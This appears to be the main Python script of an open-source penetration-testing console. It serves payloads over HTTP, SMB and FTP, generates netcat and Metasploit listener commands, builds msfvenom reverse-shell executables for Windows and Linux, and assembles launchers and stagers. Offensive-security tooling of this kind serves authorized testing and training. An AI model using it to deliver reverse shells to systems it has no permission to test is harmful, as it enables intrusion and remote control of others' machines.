import re
import argparse
import logging as logger
import os
import subprocess
from pathlib import Path
from uuid import uuid4

import colorama
import netifaces
import pyperclip
from colorama import Fore
from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

import pssutil.transformers
from pssutil.payloadmanager import PayloadManager

from pssmods.psshttp import PssHttpServer
from pssmods.psssmb import PssSmbServer
from pssmods.pssftp import PssFtpServer


VERSION = "1.0"
SCRIPT_DIR = Path(__file__).parent
CONFIG_DIR = Path(SCRIPT_DIR, "configs")


LOG_COLOR_MAP = {
    logger.getLevelName(logger.DEBUG): Fore.LIGHTGREEN_EX,
    logger.getLevelName(logger.INFO): Fore.LIGHTBLUE_EX,
    logger.getLevelName(logger.WARNING): Fore.LIGHTYELLOW_EX,
    logger.getLevelName(logger.ERROR): Fore.LIGHTRED_EX,
    logger.getLevelName(logger.CRITICAL): Fore.RED,
}


class ColoredFormatter(logger.Formatter):
    def format(self, record):
        if record.levelname in LOG_COLOR_MAP:
            record.levelname = (
                f"{LOG_COLOR_MAP[record.levelname]}{record.levelname}{Fore.RESET}"
            )
        return logger.Formatter.format(self, record)


current_logger = logger.getLogger()
current_logger.setLevel(logger.INFO)

logging_stream = logger.StreamHandler()
logging_stream.setLevel(logger.INFO)

logging_formatter = ColoredFormatter("%(asctime)s %(levelname)s> %(message)s")
logging_formatter.datefmt = "%H:%M:%S"
logging_stream.setFormatter(logging_formatter)
current_logger.addHandler(logging_stream)


def change_serve_folder(
    pm: PayloadManager, folder: Path, smb_server: PssSmbServer, ftp_server: PssFtpServer
):
    if folder.exists():
        logger.info(
            f'Serving folder changed to "{Fore.LIGHTYELLOW_EX}{folder.absolute()}{Fore.RESET}"'
        )

        prev_logging_level = logger.getLogger().level
        logger.getLogger().setLevel(logger.WARNING)

        # http serve folder is set via config
        pm.cfg.serve_folder = folder

        if pm.cfg.uploads_use_serve_folder:
            pm.cfg.uploads_folder = Path(pm.cfg.serve_folder, "uploads")

        if smb_server:
            smb_server.set_folder(folder)

        if ftp_server:
            ftp_server.set_folder(folder)

        logger.getLogger().setLevel(prev_logging_level)
    else:
        logger.warning(
            f'Folder "{Fore.LIGHTYELLOW_EX}{folder.absolute()}{Fore.RESET}" does not exist'
        )


def validate_cmd_len(cmd_arr, expected_len, fail_msg=None):
    if len(cmd_arr) >= expected_len:
        return True
    elif fail_msg:
        logger.warning(fail_msg)
    return False


def split_cmd_args(arr):
    return arr[0].lower(), arr[1:]


def build_config_path(name: str) -> Path:
    if not CONFIG_DIR.exists():
        os.makedirs(CONFIG_DIR)

    # path may start with a "/", this is intended,
    # beware of file overwriting
    config_path = Path(CONFIG_DIR, name)

    if not config_path.parent.exists():
        os.makedirs(config_path)

    return config_path


def handle_command(remaining_args: list, s: str):
    if len(remaining_args) > 0:
        first_arg_lower = remaining_args[0].lower()

        if first_arg_lower in ["c", "copy"]:
            print(s)

            try:
                pyperclip.copy(s)
            except Exception as ex:
                logger.error(f"Failed to copy to clipboard: {str(ex)}")

        elif first_arg_lower in ["x", "execute"]:
            try:
                os.system(s)
            except Exception as ex:
                logger.error(f'Failed to execute "{s}": {str(ex)}')

        elif first_arg_lower in ["t", "tmux"]:
            try:
                os.system(f"tmux new '{s}'")
            except Exception as ex:
                logger.error(f'Failed to start tmux "{s}": {str(ex)}')
    else:
        print(s)


def print_toolbar():
    pm = PayloadManager()
    bottom_str = 'SHELL: <style bg="ansiyellow">' + str(pm.cvars.SHELL) + "</style>"
    bottom_str += (
        ' | SHELLBIN: <style bg="ansiyellow">' + str(pm.cvars.SHELLBIN) + "</style>"
    )
    bottom_str += ' | LHOST: <style bg="ansiyellow">' + str(pm.cvars.LHOST) + "</style>"
    bottom_str += ' | LPORT: <style bg="ansiyellow">' + str(pm.cvars.LPORT) + "</style>"

    if pm.cfg.serve_folder:
        bottom_str += f' | Serving: "<style bg="ansiyellow">{pm.cfg.serve_folder.absolute()}</style>"'

    return HTML(bottom_str)


def print_cmd_unknown(cmd):
    if cmd and len(cmd) > 0:
        logger.warning(
            'Unknown command, type "?" or "help", "!" to execute os commands'
        )


def generate_random_filename(folder: Path, extension: str, lenght: int = 8):
    filename = abs(hash(uuid4().hex)) % (10**lenght)
    fileextension = "" if extension in ["elf"] else f".{extension}"
    return Path(folder, f"{filename}{fileextension}")


IP_REGEX = re.compile(
    r"^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
)


def cvar_proxy_netifaces(name: str, value):
    # try to resolve a network interface to its corresponding ip address
    return netifaces.ifaddresses(value)[netifaces.AF_INET][0]["addr"]


def print_help():
    print(f">> {Fore.LIGHTYELLOW_EX}Basic{Fore.RESET}")
    print("- exit                      : Shutdown server and exit.")
    print(
        "- save {NAME}               : Save current options and shell selection. No name to save as default."
    )
    print(
        "- load {NAME}               : Load saved options and shell selection. No name to load default."
    )
    print("- set {NAME} {VALUE} (s)    : Set the options value.")
    print("- serve {VALUE}      (x)    : Set the serving folder.")
    print("- http (copy)               : Print/copy the http server address.")
    print("- smb (copy)                : Print/copy the smb server address.")
    print("- ftp (copy)                : Print/copy the ftp server address.")
    print(
        "- pty (copy, execute, tmux)  : Generate/copy python pty shell upgrade command."
    )
    print("- nc (copy, execute, tmux)   : Generate/copy netcat listener command.")
    print("- ncat (copy, execute, tmux)  : Generate/copy ncat listener command.")
    print(
        "- msfl (copy, execute, tmux)  : Generate/copy metasploit multi/handler listener command."
    )
    print("- msfv {PAYLOAD} {FORMAT}     : Generate a msfvenom executable.")

    print(f"\n>> {Fore.LIGHTYELLOW_EX}Shells{Fore.RESET} (sh, shells)")
    print("- list          (l): List all loaded shells.")
    print("- select {NAME} (s): Select a shell payload.")
    print("- options       (o): Show options for the selected shell.")

    print(f"\n>> {Fore.LIGHTYELLOW_EX}Launchers{Fore.RESET} (l, launchers)")
    print("- generate {LAUNCHER} (copy) : Generate/copy a launcher command.")
    print("- list                (l)    : List all loaded launchers.")

    print(f"\n>> {Fore.LIGHTYELLOW_EX}Stagers{Fore.RESET} (st, stagers)")
    print("- list         (l): List all loaded stagers.")
    print("- print {NAME} (p): Print stager.")
    print("- build {NAME} (b): Print stager with shell.")

    print(f"\n>> {Fore.LIGHTYELLOW_EX}Transformers{Fore.RESET} (t, transformers)")
    print("- list           (l): List all loaded transformers.")
    print("- disableall     (x): Disable all transformers.")
    print("- enable {NAME}  (e): Enable a transformer.")
    print("- disable {NAME} (d): Disable a transformer.")


if __name__ == "__main__":
    colorama.init()

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--http-host",
        default="0.0.0.0",
        dest="http_host",
        help="Listen address for the HTTP server",
        type=str,
    )
    parser.add_argument(
        "--http-port",
        default="80",
        dest="http_port",
        help="Listen port for the HTTP server",
        type=int,
    )
    parser.add_argument(
        "--smb-host",
        default="0.0.0.0",
        dest="smb_host",
        help="Listen address for the SMB server",
        type=str,
    )
    parser.add_argument(
        "--smb-port",
        default="445",
        dest="smb_port",
        help="Listen port for the SMB server",
        type=int,
    )
    parser.add_argument(
        "--ftp-host",
        default="0.0.0.0",
        dest="ftp_host",
        help="Listen address for the FTP server",
        type=str,
    )
    parser.add_argument(
        "--ftp-port",
        default="21",
        dest="ftp_port",
        help="Listen port for the FTP server",
        type=int,
    )
    parser.add_argument(
        "-S",
        "--serve",
        default=None,
        dest="serve_folder",
        help="Serve folder for the HTTP server",
        type=str,
        required=True,
    )
    parser.add_argument(
        "--shells-file",
        default=str(Path(SCRIPT_DIR, "shells.json")),
        dest="shells_file",
        help="JSON file containing shells",
        type=str,
    )
    parser.add_argument(
        "--launchers-file",
        default=str(Path(SCRIPT_DIR, "launchers.json")),
        dest="launchers_file",
        help="JSON file containing launchers",
        type=str,
    )
    parser.add_argument(
        "--stagers-folder",
        default=str(Path(SCRIPT_DIR, "stagers")),
        dest="stagers_folder",
        help="Folder containing stager files",
        type=str,
    )
    parser.add_argument(
        "--lhost", default="", dest="lhost", help="Default LHOST value", type=str
    )
    parser.add_argument(
        "--lport", default="4711", dest="lport", help="Default LPORT value", type=str
    )
    parser.add_argument(
        "--shellbin",
        default="/bin/bash",
        dest="shellbin",
        help="Default shell binary to use",
        type=str,
    )
    parser.add_argument(
        "--no-http",
        default=False,
        dest="no_http",
        help="Disable HTTP server",
        action="store_true",
    )
    parser.add_argument(
        "--no-smb",
        default=False,
        dest="no_smb",
        help="Disable SMB server",
        action="store_true",
    )
    parser.add_argument(
        "--no-smb2",
        default=False,
        dest="no_smb2",
        help="Disable SMB2 support",
        action="store_true",
    )
    parser.add_argument(
        "--no-ftp",
        default=False,
        dest="no_ftp",
        help="Disable FTP server",
        action="store_true",
    )
    parser.add_argument(
        "--no-uploads",
        default=True,
        dest="accept_uploads",
        help="Disable HTTP file upload support",
        action="store_false",
    )
    parser.add_argument(
        "-U",
        "--upload-folder",
        default=None,
        dest="uploads_folder",
        help="Folder to store files uploaded via HTTP POST",
        type=str,
    )
    parser.add_argument(
        "--no-history",
        default=False,
        dest="no_history",
        help='Disable history saving in file "~/.psshistory"',
        action="store_true",
    )
    args = parser.parse_args()

    print(f">> {Fore.LIGHTYELLOW_EX}Pentest Server Suite{Fore.RESET} v{VERSION}")
    print("   ~ https://github.com/Jnnshschl/PentestServerSuite\n")

    pm = PayloadManager()

    # load all shells
    if Path(args.shells_file).exists():
        with open(args.shells_file) as shells_file:
            pm.load_shells(shells_file.read())
    else:
        logger.error(f'Shells file missing: "{args.shells_file}"')

    shells_set = {}

    for shell in pm.cfg.shells:
        shells_set[shell] = None

    # load all stagers
    if Path(args.stagers_folder).exists():
        pm.load_stagers(args.stagers_folder)
    else:
        logger.error(f'Stagers folder missing: "{args.stagers_folder}"')

    stagers_set = {}

    for stager in pm.cfg.stagers:
        stagers_set[stager] = None

    # load all launchers
    if Path(args.launchers_file).exists():
        with open(args.launchers_file) as launchers_file:
            pm.load_launchers(launchers_file.read())
    else:
        logger.error(f'Launchers file missing: "{args.launchers_file}"')

    launchers_set = {}

    for launcher in pm.cfg.launchers:
        launchers_set[launcher] = stagers_set

    # load all tranformers from the transformers.py file
    transformers_set = {}

    for name, transformer in pssutil.transformers.get_all():
        pm.transformer_register(transformer)
        transformers_set[name] = None

    logger.info(
        f"Loaded {Fore.LIGHTYELLOW_EX}{pm.launcher_count}{Fore.RESET} Launchers"
    )
    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.stager_count}{Fore.RESET} Stagers")
    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.shell_count}{Fore.RESET} Shells")
    logger.info(
        f"Loaded {Fore.LIGHTYELLOW_EX}{pm.transformer_count}{Fore.RESET} Tranformers"
    )

    # set initial cvar values
    pm.cvars.add_proxy("LHOST", cvar_proxy_netifaces)

    if args.lhost and len(args.lhost) > 0:
        pm.cvars.LHOST = args.lhost
    else:
        # try to select a default nic as LHOST
        for iface in netifaces.interfaces():
            if iface in ["tun0", "eth0"]:
                pm.cvars.LHOST = iface
                break

    pm.cvars.LPORT = args.lport if args.lport else 4711
    pm.cvars.SHELLBIN = args.shellbin if args.shellbin else "/bin/bash"

    # start servers in background
    serve_folder = Path(args.serve_folder)

    if not serve_folder.exists():
        os.makedirs(serve_folder)

        if not serve_folder.exists():
            logger.warning(
                f'Failed to create serve folder: "{Fore.LIGHTRED_EX}{serve_folder}{Fore.RESET}"'
            )
            exit(1)

    http_server = (
        PssHttpServer(args.http_host, int(args.http_port), serve_folder)
        if not args.no_http
        else None
    )

    ftp_server = (
        PssFtpServer(args.ftp_host, int(args.ftp_port), serve_folder)
        if not args.no_ftp
        else None
    )

    smb_server = (
        PssSmbServer(args.smb_host, int(args.smb_port), serve_folder)
        if not args.no_smb
        else None
    )

    # change serving folder if supplied
    if args.serve_folder:
        change_serve_folder(pm, serve_folder, smb_server, ftp_server)

    # set uploads folder to supplied value, otherwise place stuff in the serve folder
    pm.cfg.accept_uploads = args.accept_uploads

    if pm.cfg.accept_uploads:
        if args.uploads_folder:
            pm.cfg.uploads_folder = Path(args.uploads_folder)
        else:
            pm.cfg.uploads_folder = Path(pm.cfg.serve_folder, "uploads")
            pm.cfg.uploads_use_serve_folder = True

    # setup prompt
    shells_dict = {
        "list": None,
        "set": shells_set,
        "select": shells_set,
        "options": None,
    }

    launchers_dict = {
        "list": None,
        "generate": launchers_set,
    }

    stagers_dict = {
        "list": None,
        "print": stagers_set,
        "build": stagers_set,
    }

    transformers_dict = {
        "list": None,
        "disableall": None,
        "enable": transformers_set,
        "disable": transformers_set,
    }

    netifaces_dict = {}

    for iface in netifaces.interfaces():
        netifaces_dict[iface] = None

    ports_dict = {
        "25": None,
        "80": None,
        "443": None,
        "1337": None,
        "4444": None,
        "4711": None,
    }

    msfv_encoders = {"x86/shikata_ga_nai": None}

    msfv_tlinux_dict = {
        "elf": None,
        "asp": None,
        "war": None,
    }

    msfv_twindows_dict = {
        "exe": None,
        "msi": None,
        "dll": None,
        "vba": None,
        "asp": None,
        "aspx": None,
        "war": None,
    }

    msfv_payload_dict = {
        "linux/x86/shell/reverse_tcp": msfv_tlinux_dict,
        "linux/x64/shell/reverse_tcp": msfv_tlinux_dict,
        "linux/x86/shell_reverse_tcp": msfv_tlinux_dict,
        "linux/x64/shell_reverse_tcp": msfv_tlinux_dict,
        "linux/x86/meterpreter/reverse_tcp": msfv_tlinux_dict,
        "linux/x64/meterpreter/reverse_tcp": msfv_tlinux_dict,
        "linux/x86/meterpreter_reverse_tcp": msfv_tlinux_dict,
        "linux/x64/meterpreter_reverse_tcp": msfv_tlinux_dict,
        "windows/shell/reverse_tcp": msfv_twindows_dict,
        "windows/shell_reverse_tcp": msfv_twindows_dict,
        "windows/x64/shell_reverse_tcp": msfv_twindows_dict,
        "windows/meterpreter/reverse_tcp": msfv_twindows_dict,
        "windows/x64/meterpreter/reverse_tcp": msfv_twindows_dict,
        "windows/meterpreter_reverse_tcp": msfv_twindows_dict,
        "windows/x64/meterpreter_reverse_tcp": msfv_twindows_dict,
        "java/jsp_shell_reverse_tcp": {"raw": None},
        "php/reverse_php": {"raw": None},
    }

    copy_dict = {"copy": None}

    cli_session = PromptSession(
        history=None
        if args.no_history
        else FileHistory(Path(os.path.expanduser("~"), ".psshistory")),
        auto_suggest=AutoSuggestFromHistory(),
        bottom_toolbar=print_toolbar,
        style=Style.from_dict(
            {"pss": "ansibrightyellow", "bottom-toolbar": "#303030 bg:#dddddd"}
        ),
        completer=NestedCompleter.from_nested_dict(
            {
                "exit": None,
                "save": None,
                "load": None,
                "set": {
                    "LHOST": netifaces_dict,
                    "LPORT": ports_dict,
                },
                "serve": None,
                "http": copy_dict,
                "smb": copy_dict,
                "ncl": copy_dict,
                "msfl": copy_dict,
                "msfv": msfv_payload_dict,
                "pty": copy_dict,
                "sh": shells_dict,
                "shell": shells_dict,
                "shells": shells_dict,
                "l": launchers_dict,
                "launcher": launchers_dict,
                "launchers": launchers_dict,
                "st": stagers_dict,
                "stager": stagers_dict,
                "stagers": stagers_dict,
                "t": transformers_dict,
                "transformer": transformers_dict,
                "transformers": transformers_dict,
            }
        ),
        message=[
            ("class:pss", "pss"),
            ("", "> "),
        ],
    )

    while 1:
        input_arr = list(
            filter(
                None,
                cli_session.prompt()
                .strip()
                .split(
                    " ",
                ),
            )
        )
        cmd, args = split_cmd_args(input_arr)

        if cmd in ["?", "help"]:
            print_help()

        elif cmd.startswith("!"):
            try:
                os_cmd = "".join(cmd[1:]) + " " + " ".join(args)

                try:
                    if len(os_cmd) == 0:
                        os_cmd = os.environ.get("SHELL", "bash")

                    os.system(os_cmd)
                except Exception as ex:
                    logger.warning(
                        f'Failed to execute: "{Fore.LIGHTRED_EX}{os_cmd}{Fore.RESET}": {ex}'
                    )
            except Exception as ex:
                logger.warning(f"Failed parse command: {ex}")

        elif cmd == "exit":
            break

        elif cmd == "save":
            pm.save_config(build_config_path(args[0] if len(args) > 0 else "default"))

        elif cmd == "load":
            pm.load_config(build_config_path(args[0] if len(args) > 0 else "default"))

        elif cmd in ["s", "set"]:
            if validate_cmd_len(
                input_arr, 2, 'Missing arguments: "cvar name", "value"'
            ):
                if validate_cmd_len(input_arr, 3, 'Missing arguments: "value"'):
                    pm.cvars[input_arr[1]] = " ".join(input_arr[2:])

        elif cmd in ["x", "serve"]:
            if validate_cmd_len(input_arr, 2, 'Missing arguments: "folder"'):
                change_serve_folder(
                    pm, Path(" ".join(input_arr[1:])), smb_server, ftp_server
                )

        elif cmd == "http":
            handle_command(args, f"http://{pm.cvars.LHOST}/")

        elif cmd == "smb":
            handle_command(args, f"\\\\{pm.cvars.LHOST}\\{smb_server.default_share}\\")

        elif cmd == "ftp":
            handle_command(args, f"anonymous@{pm.cvars.LHOST}")

        elif cmd in ["l", "launcher", "launchers"]:
            # LAUNCHER sub-commands
            if validate_cmd_len(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = split_cmd_args(args)

                if sub_cmd in ["l", "list"]:
                    for launcher in pm.cfg.launchers:
                        print(launcher)

                elif sub_cmd in ["g", "generate"]:
                    if validate_cmd_len(input_arr, 3, 'Missing arguments: "launcher"'):
                        launcher, sub_sub_args = split_cmd_args(sub_args)

                        if validate_cmd_len(
                            input_arr,
                            4,
                            f'No stager sepcified, using "{Fore.LIGHTYELLOW_EX}pss/direct{Fore.RESET}" as default...',
                        ):
                            stager, sub_sub_args = split_cmd_args(sub_sub_args)
                        else:
                            stager = "pss/direct"

                        launcher_cmd = pm.launcher_generate(
                            launcher, stager, smb_server.default_share
                        )
                        handle_command(sub_sub_args, launcher_cmd)

                else:
                    print_cmd_unknown(sub_cmd)

        elif cmd == "nc":
            handle_command(args, f"nc -lvnp {pm.cvars.LPORT}")

        elif cmd == "ncat":
            handle_command(args, f"ncat -lvnp {pm.cvars.LPORT}")

        elif cmd == "socat":
            handle_command(
                args, f"socat file:`tty`,raw,echo=0 tcp-listen:{pm.cvars.LPORT}"
            )

        elif cmd == "msfl":
            handle_command(
                args,
                f'msfconsole -q -x "use multi/handler; set LHOST {pm.cvars.LHOST}; set LPORT {pm.cvars.LPORT}; run"',
            )

        elif cmd == "msfv":
            if validate_cmd_len(input_arr, 2, 'Missing arguments: "payload", "type"'):
                if validate_cmd_len(input_arr, 3, 'Missing arguments: "type"'):
                    msfv_payload, sub_args = split_cmd_args(args)
                    msfv_type, sub_args = split_cmd_args(sub_args)

                    msfv_tmpfolder = Path(pm.cfg.serve_folder, "tmp")

                    if len(sub_args) == 0:
                        msfv_tmpfile = generate_random_filename(
                            msfv_tmpfolder, msfv_type
                        )
                    else:
                        msfv_tmpfile = sub_args[0]

                    if not msfv_tmpfolder.exists():
                        os.makedirs(msfv_tmpfolder)

                    msfv_cmd = f"msfvenom -p {msfv_payload} LHOST={pm.cvars.LHOST} LPORT={pm.cvars.LPORT} -f {msfv_type} -o {msfv_tmpfile}"
                    subprocess.call(
                        msfv_cmd.split(" "),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT,
                    )
                    logger.info(
                        f'Generated: "{Fore.LIGHTYELLOW_EX}{msfv_tmpfile}{Fore.RESET}"\n{Fore.LIGHTBLACK_EX}{msfv_cmd}{Fore.RESET}'
                    )

        elif cmd == "pty":
            handle_command(
                args, f"python -c 'import pty; pty.spawn(\"{pm.cvars.SHELLBIN}\")'"
            )

        elif cmd in ["sh", "shell", "shells"]:
            # SHELL sub-commands
            if validate_cmd_len(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = split_cmd_args(args)

                if sub_cmd in ["l", "list"]:
                    for shell in pm.cfg.shells:
                        print(shell)

                elif sub_cmd in ["s", "set", "select"]:
                    shell = sub_args[0].lower()

                    if pm.shell_exists(shell):
                        pm.cvars.SHELL = shell
                    else:
                        logger.warning(
                            f'No shell found with name "{Fore.LIGHTRED_EX}{shell}{Fore.RESET}". If you want to directly inject something, set the SHELL option manually using "set SHELL ..."'
                        )

                elif sub_cmd in ["o", "options"]:
                    shell = pm.cvars.SHELL
                    logger.info(
                        f'Selected shell "{Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}"'
                    )

                    if shell:
                        for cvar in pm.get_cvars_shell(shell):
                            val = pm.cvars[cvar]

                            if val:
                                logger.info(
                                    f'{cvar} = "{Fore.LIGHTYELLOW_EX}{val}{Fore.RESET}"'
                                )
                            else:
                                logger.info(
                                    f"{cvar} = {Fore.LIGHTRED_EX}Not set{Fore.RESET}"
                                )

                else:
                    print_cmd_unknown(sub_cmd)

        elif cmd in ["st", "stager", "stagers"]:
            # STAGER sub-commands
            if validate_cmd_len(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = split_cmd_args(args)

                if sub_cmd in ["l", "list"]:
                    for stager in pm.cfg.stagers:
                        print(stager)

                elif sub_cmd in ["p", "print"]:
                    print(pm.stager_get_content(sub_args[0].lower()))

                elif sub_cmd in ["b", "build"]:
                    print(pm.build_payload(sub_args[0].lower()))

                else:
                    print_cmd_unknown(sub_cmd)

        elif cmd in ["t", "transformer", "transformers"]:
            # TRANFORMER sub-commands
            if validate_cmd_len(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = split_cmd_args(args)

                if sub_cmd in ["l", "list"]:
                    for transformer in pm.cfg.transformers.keys():
                        is_enabled = pm.cfg.transformers[transformer]["enabled"]
                        color = Fore.LIGHTGREEN_EX if is_enabled else Fore.LIGHTRED_EX
                        print(f"{transformer}: {color}{is_enabled}{Fore.RESET}")

                elif sub_cmd in ["x", "disableall"]:
                    for transformer in pm.cfg.transformers.keys():
                        is_enabled = pm.cfg.transformers[transformer]["enabled"]

                        if is_enabled:
                            pm.cfg.transformers[transformer]["enabled"] = False
                            logger.info(
                                f"{transformer} {Fore.LIGHTRED_EX}disabled{Fore.RESET}"
                            )

                elif sub_cmd in ["e", "+", "enable"]:
                    pm.tranformer_switch(sub_args[0], True)

                elif sub_cmd in ["d", "-", "disable"]:
                    pm.tranformer_switch(sub_args[0], False)

                elif args[0] in pm.cfg.transformers:
                    pm.tranformer_switch(args[0])

                else:
                    print_cmd_unknown(sub_cmd)

        else:
            print_cmd_unknown(cmd)

    colorama.deinit()
